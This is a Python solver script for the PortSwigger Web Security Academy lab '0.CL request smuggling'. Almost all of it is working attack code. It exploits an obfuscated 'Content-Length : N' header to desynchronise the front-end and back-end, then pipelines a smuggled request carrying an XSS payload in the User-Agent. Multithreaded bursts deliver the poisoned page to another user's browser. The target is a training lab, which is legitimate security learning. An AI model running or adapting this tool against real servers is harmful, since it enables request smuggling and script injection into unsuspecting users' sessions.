#!/usr/bin/env python3
"""
Automated solver: PortSwigger Web Security Academy
Lab "0.CL request smuggling" (EXPERT)

Usage
    uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net/"
    uv run python solve.py --url ... --wait 600 --threads 10
    uv run python solve.py --url ... --variants queue,pipe
    uv run python solve.py --url ... --diagnose-only

Objective (live from the Academy description page)
    "This lab is vulnerable to 0.CL request smuggling. Carlos visits the
     homepage every five seconds. To solve the lab, exploit the vulnerability
     to execute alert() in his browser."

How it works
------------
The front-end does not recognise an obfuscated ``Content-Length : N`` header
(space before the colon) but forwards it verbatim; the back-end parses it.  That
Hidden-Visible (H-V) discrepancy is a **0.CL** desync:

  * stage 1 - ``POST <early-response gadget>`` with only the obfuscated header
    and no body.  The front-end treats the request as body-less and forwards it,
    the back-end waits for N bytes: the upstream connection deadlocks.  A
    server-level redirect (``/resources/css/<anything>`` -> 302) answers before
    the body arrives, breaking the deadlock while keeping the connection open.
  * stage 2 - a request whose header block is exactly N bytes.  The back-end
    eats it as stage 1's body and parses the bytes appended after it as
    pipelined requests, so an attacker-chosen request (a blog post page whose
    ``User-Agent`` carries ``x"><script>alert(1)</script>``) is served from that
    connection.  The blog post page reflects ``User-Agent`` unescaped into a
    hidden input value, so the script executes in whatever browser receives it.

Carlos polls ``/`` every five seconds; the smuggled page is served to him and
the lab's own status widget flips.

Nothing instance-specific is hardcoded: host/port come from ``--url``, the post
id is scraped from the homepage, the early-response gadget is probed, and no
session, CSRF token or exploit-server URL is needed.

Exit codes: 0 solved, 1 exploit sent but not solved, 2 usage, 3 unreachable.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlsplit

SOLVED_MARKER = b"widgetcontainer-lab-status is-solved"
UNSOLVED_MARKER = b"widgetcontainer-lab-status is-notsolved"

# Lab-definition values (from the lab spec / published PoC, not an instance).
XSS_PAYLOAD = b'x"><script>alert(1)</script>'
GADGET_CANDIDATES = [
    b"/resources/css/anything",
    b"/resources/images/blog.svg",
    b"/resources/js/anything",
]
DEFAULT_WAIT = 480.0
DEFAULT_THREADS = 8
ALL_VARIANTS = ("queue", "pipe", "absorb", "sameconn")


# --------------------------------------------------------------------- client
class Lab:
    """Raw TLS HTTP/1.1 client with byte-exact control and request accounting."""

    def __init__(self, url: str):
        p = urlsplit(url)
        if p.scheme not in ("http", "https") or not p.hostname:
            raise ValueError(f"unsupported lab URL: {url!r}")
        self.host = p.hostname
        self.port = p.port or (443 if p.scheme == "https" else 80)
        self.tls = p.scheme == "https"
        self.host_b = self.host.encode()
        self.ctx = ssl.create_default_context()
        self.ctx.set_alpn_protocols(["http/1.1"])
        self.lock = threading.Lock()
        self.requests = 0
        self.bytes_sent = 0
        self.start = time.time()

    def open(self, timeout: float = 10.0):
        s = socket.create_connection((self.host, self.port), timeout=timeout)
        if self.tls:
            s = self.ctx.wrap_socket(s, server_hostname=self.host)
        s.settimeout(timeout)
        return s

    def send(self, sock, raw: bytes):
        sock.sendall(raw)
        with self.lock:
            self.requests += 1
            self.bytes_sent += len(raw)

    @staticmethod
    def drain(sock, idle: float = 1.0, limit: float = 6.0) -> bytes:
        """Read until EOF, error, or `idle` seconds of silence (max `limit`)."""
        sock.settimeout(idle)
        out, t0 = b"", time.time()
        while time.time() - t0 < limit:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                out += chunk
                t0 = time.time()
            except (socket.timeout, OSError):
                break
        return out

    def request(self, raw: bytes, idle: float = 1.5) -> bytes:
        s = self.open()
        try:
            self.send(s, raw)
            return self.drain(s, idle=idle)
        finally:
            try:
                s.close()
            except OSError:
                pass

    def get(self, path: bytes, ua: bytes = b"Mozilla/5.0", extra: bytes = b"",
            idle: float = 2.0) -> bytes:
        raw = (b"GET " + path + b" HTTP/1.1\r\nHost: " + self.host_b +
               b"\r\nUser-Agent: " + ua + b"\r\n" + extra +
               b"Connection: close\r\n\r\n")
        return self.request(raw, idle=idle)

    def status(self, attempts: int = 1, delay: float = 1.5, settle: float = 0.0):
        """True/False from the lab widget, None when the answer is unreadable.

        The attack leaves queued/stale responses in the front-end's pool, so a
        status read can return an old page (one rendered before the flip) or a
        stray error.  Only a page carrying a widget marker counts; everything
        else is retried, and ``settle`` gives the pool a moment to drain first.
        """
        if settle:
            time.sleep(settle)
        for i in range(max(1, attempts)):
            try:
                raw = self.get(b"/")
            except OSError:
                raw = b""
            if b"is-solved" in raw or b"Congratulations, you solved the lab" in raw:
                return True
            if b"is-notsolved" in raw or b"widgetcontainer-lab-status" in raw:
                return False
            if i + 1 < attempts:
                time.sleep(delay)
        return None


    def elapsed(self) -> float:
        return time.time() - self.start


def parse_status_lines(data: bytes):
    return [m.group(1).decode() for m in re.finditer(rb"HTTP/1\.1 (\d{3})", data)]


# ------------------------------------------------------------------ discovery
def discover_post_id(home: bytes, lab: Lab):
    ids = [int(x) for x in re.findall(rb"/post\?postId=(\d+)", home)]
    if not ids:
        return None
    for pid in ids:
        try:
            page = lab.get(b"/post?postId=%d" % pid)
        except OSError:
            continue
        if b"<title>" in page:
            return pid
    return ids[0]


def discover_gadget(lab: Lab, rounds: int = 5, delay: float = 4.0):
    """A path the back-end answers before reading the request body (server 3xx).

    An instance that was just desynced answers badly for a few seconds, so the
    probe is repeated before giving up.
    """
    for r in range(max(1, rounds)):
        for cand in GADGET_CANDIDATES:
            try:
                raw = lab.get(cand, idle=1.5)
            except OSError:
                continue
            codes = parse_status_lines(raw)
            if codes and codes[0].startswith("3") and len(raw) < 4096:
                return cand
        if r + 1 < rounds:
            time.sleep(delay)
    return None


def control_xss(lab: Lab, post_id: int, attempts: int = 5, delay: float = 2.5):
    """Confirm the User-Agent reflection is unescaped.

    Retried: right after an attack the front-end can answer with a stray
    response, which would otherwise look like a missing reflection.
    """
    raw = b""
    for i in range(max(1, attempts)):
        try:
            raw = lab.get(b"/post?postId=%d" % post_id, ua=XSS_PAYLOAD)
        except OSError:
            raw = b""
        if XSS_PAYLOAD in raw:
            return True, raw
        if i + 1 < attempts:
            time.sleep(delay)
    return False, raw


def prove_0cl(lab: Lab, gadget: bytes) -> dict:
    """Deadlock on a non-gadget path + pipelined-bytes proof."""
    result = {"deadlock": False, "pipelined": [], "raw_prefix": b""}

    # 1) obfuscated Content-Length, no body, ordinary path -> no response at all
    s = lab.open()
    try:
        lab.send(s, b"POST / HTTP/1.1\r\nHost: " + lab.host_b +
                 b"\r\nContent-Length : 20\r\n\r\n")
        got = lab.drain(s, idle=3.0, limit=4.5)
    finally:
        s.close()
    result["deadlock"] = (got == b"")

    # 2) complete the hidden body with a request; the leftover bytes are parsed
    #    as a pipelined request by the back-end and answered out of order
    s = lab.open()
    try:
        lab.send(s, b"GET " + gadget + b" HTTP/1.1\r\nHost: " + lab.host_b +
                 b"\r\nContent-Length : 20\r\n\r\n")
        time.sleep(0.02)
        lab.send(s, b"GET / HTTP/1.1\r\nX: yGET /wrtz HTTP/1.1\r\nHost: " + lab.host_b +
                 b"\r\nConnection: keep-alive\r\n\r\n")
        got = lab.drain(s, idle=2.0, limit=5.0)
    finally:
        s.close()
    result["pipelined"] = parse_status_lines(got)
    result["raw_prefix"] = got[:160]
    return result


# ---------------------------------------------------------------- attack frames
def build_frames(lab: Lab, post_id: int, gadget: bytes):
    H = lab.host_b
    smuggled = (b"GET /post?postId=%d HTTP/1.1\r\nHost: " % post_id) + H + \
               b"\r\nUser-Agent: " + XSS_PAYLOAD + \
               b"\r\nContent-Type: application/x-www-form-urlencoded\r\n" \
               b"Connection: keep-alive\r\nContent-Length: 5\r\n\r\nx=1"
    revealed = (b"GET /404 HTTP/1.1\r\nHost: " + H +
                b"\r\nUser-Agent: foo\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                b"Connection: keep-alive\r\n\r\n")

    def stage1_for(n: int) -> bytes:
        return (b"POST " + gadget + b" HTTP/1.1\r\nHost: " + H +
                b"\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                b"Connection: keep-alive\r\nContent-Length : %d\r\n\r\n" % n)

    # queue: the OPTIONS body is precisely the smuggled request
    chopped_q = b"OPTIONS / HTTP/1.1\r\nContent-Length: %d\r\nX: Y" % len(smuggled)
    stage1_q = stage1_for(len(chopped_q))
    frames = {
        "queue": (stage1_q, chopped_q + revealed + smuggled),
        "pipe": (stage1_q, chopped_q + revealed + smuggled),
        "sameconn": (stage1_q, chopped_q + revealed + smuggled),
        # absorb: smuggle a request cut mid-header so the victim's own bytes
        # complete it and the victim is answered with the post page
        "absorb": None,
    }
    cut = min(123, max(40, len(smuggled) - 20))
    chopped_b = b"OPTIONS / HTTP/1.1\r\nContent-Length: %d\r\nX: Y" % cut
    frames["absorb"] = (stage1_for(len(chopped_b)), chopped_b + revealed + smuggled[:cut])
    return frames, smuggled


# ---------------------------------------------------------------------- attack
class Attack:
    def __init__(self, lab: Lab, frames: dict, names: list[str], threads: int,
                 evidence_dir: str):
        self.lab = lab
        self.frames = frames
        self.names = names
        self.threads = max(1, threads)
        self.evidence_dir = evidence_dir
        self.stop = threading.Event()
        self.solved = threading.Event()
        self.lock = threading.Lock()
        self.attempts = 0
        self.leaks = 0
        self.codes: dict[str, int] = {}
        self.leak_sample = b""
        self.pause = threading.Event()   # set = workers idle, status reads safe

    # -- bookkeeping -----------------------------------------------------
    def _note(self, out: bytes):
        if not out:
            return
        with self.lock:
            for code in parse_status_lines(out):
                self.codes[code] = self.codes.get(code, 0) + 1
            if XSS_PAYLOAD in out:
                self.leaks += 1
                if not self.leak_sample:
                    self.leak_sample = out[:200000]

    def _fire(self, frame: bytes, idle: float = 0.2) -> bytes:
        sock = self.lab.open()
        try:
            self.lab.send(sock, frame)
            return self.lab.drain(sock, idle=idle, limit=2.5)
        finally:
            try:
                sock.close()
            except OSError:
                pass

    # -- worker modes ----------------------------------------------------
    def _worker(self, wid: int):
        pipe_sock = None
        i = wid
        while not self.stop.is_set():
            if self.pause.is_set():
                time.sleep(0.03)
                continue
            name = self.names[i % len(self.names)]
            i += 1
            stage1, stage2 = self.frames[name]
            try:
                if name == "pipe":
                    # persistent pipelined connection: high rate, and the
                    # smuggled page shows up in-band on our own response stream
                    if pipe_sock is None:
                        pipe_sock = self.lab.open()
                    self.lab.send(pipe_sock, stage1)
                    self.lab.send(pipe_sock, stage2)
                    out = self.lab.drain(pipe_sock, idle=0.05, limit=0.5)
                    self._note(out)
                elif name == "sameconn":
                    sock = self.lab.open()
                    try:
                        self.lab.send(sock, stage1)
                        time.sleep(0.008)
                        self.lab.send(sock, stage2)
                        time.sleep(0.04)
                        self.lab.send(sock, b"GET / HTTP/1.1\r\nHost: " +
                                      self.lab.host_b +
                                      b"\r\nUser-Agent: Mozilla/5.0\r\n"
                                      b"Connection: keep-alive\r\n\r\n")
                        out = self.lab.drain(sock, idle=0.3, limit=2.0)
                        self._note(out)
                    finally:
                        sock.close()
                else:
                    # stage 1 and stage 2 on separate client connections, the
                    # configuration that delivered the smuggled page to the
                    # simulated victim on the tested instance
                    out1 = self._fire(stage1, idle=0.18)
                    out2 = self._fire(stage2, idle=0.18)
                    self._note(out1)
                    self._note(out2)
                with self.lock:
                    self.attempts += 1
            except (OSError, ssl.SSLError):
                with self.lock:
                    self.codes["conn_error"] = self.codes.get("conn_error", 0) + 1
                if pipe_sock is not None:
                    try:
                        pipe_sock.close()
                    except OSError:
                        pass
                    pipe_sock = None
                time.sleep(0.05)
        if pipe_sock is not None:
            try:
                pipe_sock.close()
            except OSError:
                pass

    def run(self, wait_s: float, watch: bool = True, burst: float = 8.0) -> bool:
        """Attack in bursts and poll between them.

        Continuous traffic keeps the front-end's connection pool full of stale
        and queued responses, so a status read taken during the storm can return
        a page rendered *before* the flip.  Pausing for ~1 s and then reading the
        widget gives a trustworthy answer; the flip is detected within one cycle
        instead of being missed for minutes.
        """
        for i in range(self.threads):
            threading.Thread(target=self._worker, args=(i,), daemon=True).start()
        t0 = time.time()
        cycle = 0
        try:
            while not self.stop.is_set() and time.time() - t0 < wait_s:
                cycle += 1
                self.pause.clear()
                burst_end = min(t0 + wait_s, time.time() + burst)
                while time.time() < burst_end and not self.stop.is_set():
                    time.sleep(0.2)
                self.pause.set()
                time.sleep(0.8)                     # let queued responses drain
                st = None
                if watch:
                    # a saturated pool can still hand us a stale page or a stray
                    # error; keep reading while the attack is paused
                    for _ in range(2):
                        st = self.lab.status(attempts=3, delay=1.0)
                        if st is not None:
                            break
                        time.sleep(1.2)
                mark = {True: "SOLVED", False: "not solved", None: "unreadable"}[st]
                print("  [attack] %5.0fs  pairs=%-6d got_page=%-4d widget=%-11s status=%s"
                      % (time.time() - t0, self.attempts, self.leaks, mark,
                         dict(self.codes)), flush=True)
                if st is True:
                    self.solved.set()
                    break
        finally:
            self.pause.set()
            self.stop.set()
            time.sleep(0.4)
        return self.solved.is_set()



# ------------------------------------------------------------------------ main
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger '0.CL request smuggling' lab")
    ap.add_argument("--url", required=True, help="lab instance URL")
    ap.add_argument("--wait", type=float, default=DEFAULT_WAIT,
                    help=f"attack window in seconds (default {DEFAULT_WAIT:.0f})")
    ap.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                    help=f"attacker threads (default {DEFAULT_THREADS})")
    ap.add_argument("--variants", default="queue,pipe",
                    help=f"comma separated subset of {','.join(ALL_VARIANTS)}")
    ap.add_argument("--demo", type=float, default=20.0,
                    help="attack seconds when the instance is already solved")
    ap.add_argument("--diagnose-only", action="store_true",
                    help="prove the primitives and stop")
    ap.add_argument("--force", action="store_true",
                    help="attack even if the baseline widget says solved "
                         "(exit 0 only when the widget confirms solved)")
    ap.add_argument("--evidence", default="evidence", help="evidence directory")
    args = ap.parse_args()

    try:
        lab = Lab(args.url)
    except ValueError as e:
        print(f"[!] {e}", file=sys.stderr)
        return 2

    os.makedirs(args.evidence, exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    stamp = time.strftime("%Y%m%d-%H%M%S")
    t_start = time.time()
    report = {"url": args.url, "host": lab.host, "started": stamp}

    print(f"[*] target       : {lab.host}")

    home = b""
    for _ in range(6):
        try:
            home = lab.get(b"/", idle=3.0)
        except OSError:
            home = b""
        if SOLVED_MARKER in home or UNSOLVED_MARKER in home:
            break
        time.sleep(3.0)
    if not home:
        print("[!] lab unreachable: empty response", file=sys.stderr)
        return 3

    baseline_solved = SOLVED_MARKER in home
    report["baseline_solved"] = baseline_solved
    print(f"[*] lab status   : {'SOLVED (already)' if baseline_solved else 'not solved'}")

    post_id = discover_post_id(home, lab)
    for _ in range(4):
        if post_id is not None:
            break
        time.sleep(3.0)
        try:
            post_id = discover_post_id(lab.get(b"/", idle=3.0), lab)
        except OSError:
            pass
    if post_id is None:
        print("[!] could not discover a blog post id", file=sys.stderr)
        return 3
    print(f"[*] post id      : {post_id}")
    report["post_id"] = post_id

    ok_xss, xss_raw = control_xss(lab, post_id)
    report["ua_reflection"] = ok_xss
    print("[*] UA reflection: " +
          ("confirmed (unescaped <script>)" if ok_xss else "NOT confirmed"))
    with open(os.path.join(args.evidence, "control-ua-xss-response.html"), "wb") as f:
        f.write(xss_raw)
    if not ok_xss:
        print("[!] no unescaped User-Agent reflection - aborting", file=sys.stderr)
        return 1

    gadget = discover_gadget(lab)
    if gadget is None:
        print("[!] no early-response gadget found", file=sys.stderr)
        return 1
    report["gadget"] = gadget.decode()
    print(f"[*] early gadget : {gadget.decode()}")

    proof = prove_0cl(lab, gadget)
    report["proof_0cl"] = {"deadlock": proof["deadlock"],
                           "pipelined": proof["pipelined"]}
    print(f"[*] 0.CL proof   : deadlock={proof['deadlock']} pipelined={proof['pipelined']}")
    with open(os.path.join(args.evidence, "desync-proof.txt"), "w") as f:
        f.write("obfuscated Content-Length, no body -> deadlock: %s\n" % proof["deadlock"])
        f.write("pipelined request/response codes: %s\n\n" % proof["pipelined"])
        f.write(repr(proof["raw_prefix"]) + "\n")

    if args.diagnose_only:
        print("[*] diagnose-only: primitives hold, attack not fired")
        return 0

    frames, smuggled = build_frames(lab, post_id, gadget)
    names = [n.strip() for n in args.variants.split(",") if n.strip() in frames]
    if not names:
        print(f"[!] no valid variants (choose from {','.join(ALL_VARIANTS)})",
              file=sys.stderr)
        return 2
    for n in names:
        with open(os.path.join(args.evidence, f"attack-{n}.http"), "wb") as f:
            f.write(frames[n][0] + b"\n==== stage 2 ====\n" + frames[n][1] + b"\n")

    demo_mode = baseline_solved and not args.force
    wait_s = args.demo if demo_mode else args.wait
    print(f"[*] attack       : variants={names} threads={args.threads} "
          f"window={wait_s:.0f}s" +
          (" (demo on an already-solved instance)" if demo_mode else ""))
    atk = Attack(lab, frames, names, args.threads, args.evidence)
    interrupted = False
    try:
        solved = atk.run(wait_s, watch=not demo_mode)
    except KeyboardInterrupt:
        interrupted = True
        solved = False
        atk.stop.set()
        print("\n[!] interrupted - verifying the widget before exiting", flush=True)

    if atk.leak_sample:
        with open(os.path.join(args.evidence, "leaked-smuggled-page.html"), "wb") as f:
            f.write(atk.leak_sample)

    final = lab.status(attempts=8, delay=2.0, settle=1.5)
    report.update({
        "solved_after": solved,
        "interrupted": interrupted,
        "final_status": ("solved" if final else "not solved" if final is False else "unknown"),
        "pairs": atk.attempts,
        "leaked_responses": atk.leaks,
        "http_requests": lab.requests,
        "bytes_sent": lab.bytes_sent,
        "status_codes": atk.codes,
        "elapsed_seconds": round(lab.elapsed(), 1),
        "attack_seconds": round(time.time() - t_start, 1),
    })
    with open(os.path.join("logs", f"run-{stamp}.json"), "w") as f:
        json.dump(report, f, indent=2)

    print(f"[*] requests     : {lab.requests} ({lab.bytes_sent} bytes) "
          f"in {lab.elapsed():.1f}s")
    print(f"[*] smuggled page: served {atk.leaks} time(s) to our own requests")
    print(f"[*] final status : {report['final_status']}")
    if final:
        print("[+] lab is solved - caused by solver: no (was already solved)"
              if baseline_solved and not args.force else "[+] lab solved by this run")
        return 0
    print("[-] exploit delivered but the lab is not solved")
    return 1


if __name__ == "__main__":
    sys.exit(main())
